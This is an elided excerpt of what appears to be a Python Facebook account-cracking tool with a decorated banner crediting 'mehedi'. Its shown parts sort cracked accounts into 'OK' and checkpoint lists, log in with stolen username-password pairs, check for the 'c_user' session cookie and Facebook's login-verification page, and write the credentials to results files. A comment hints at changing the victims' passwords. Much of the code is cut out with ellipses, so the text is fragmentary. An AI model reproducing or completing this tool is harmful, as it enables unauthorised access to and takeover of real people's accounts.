...
def logo():
 ...
 ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝\n{N} ▌│█║▌║▌║META FACEBOOK METHOD║▌║▌║█│▌{N} """)
    print("╔════════════════════════════════════════╗")
    print(f"║{P}[{H}•{P}] Author    : mehedi                 {N}║")
    print(f"║{P}[{H}•{P}] Whatsapp  : #####         {N}║")
    print(f"║{P}[{H}•{P}] Github    : not{N}  ║")
    ...
    if len(ok) != 0 or len(cp) != 0:
        ...
        if cek_cp =="":
            ...
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                print(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[mehedi-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[mehedi-CP] ", ""), titid[1])
...
###### CEK HASIL CRACK #####
        ...
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace("[mehedi-OK] ","\x1b[1;92m[ROY-OK] ").replace("[ROY-CP] ", "\x1b[1;93m[ROY-CP] ")
    ...
    if "c_user" in session.cookies.get_dict():
        ...
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                ...
                open('results/ERROR.txt', 'a').write(f"[mehedi-CP] {user} • {pasw}\n")
                print(f" {N}[{M}!{N}] Error")
        else:
        ...
        open('results/INVALID-OK.txt', 'a').write(f"[mehedi-CP] {user} • {pasw}\n")
#UBAH PW
